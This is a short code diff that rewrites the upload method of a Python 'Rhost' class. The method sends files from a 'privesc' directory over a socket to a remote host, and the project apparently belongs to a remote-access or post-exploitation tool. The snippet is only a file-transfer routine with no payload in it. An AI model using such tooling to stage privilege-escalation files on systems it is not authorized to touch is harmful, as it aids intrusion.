@@ -117,21 +117,21 @@ class Rhost:
 
     def upload(conn,src,dest):
         bufferSize = 2**18
-        try:
-            file=open("/opt/tamXX/privesc/"+src,"r")
-            content = file.read()
-            file.close()
-            command = "upload {0} {1}".format(src,dest)
-            conn.send(command.encode())
-            try:
-                fini = "false"
-                while fini == "false":
-                    conn.send(content.encode('utf-8'))
-                    time.sleep(1)
-                    print(conn.recv(bufferSize).decode())
-                    if bufferSize > len(content):
-                        fini = "true"
-            except:
-                print("Error !")
-        except:
-            print("Can't open this file or this file doesn't exist !")
+        src = "/opt/tamXX/privesc/"+src
+        if os.path.isfile(src):
+            size = os.path.getsize(src)
+            c = "upload "+str(size)+" "+dest
+            conn.send(c.encode())
+            with open(src,"r") as f:
+                content = f.read(1024)
+                t = 1024
+                print(size)
+                while t < size:
+                    t += 1024
+                    content += f.read(1024)
+                print(content)
+                conn.send(content.encode())
+                f.close()
+            print(conn.recv(1024).decode())
+        else:
+            print('This file doesn\' exist')
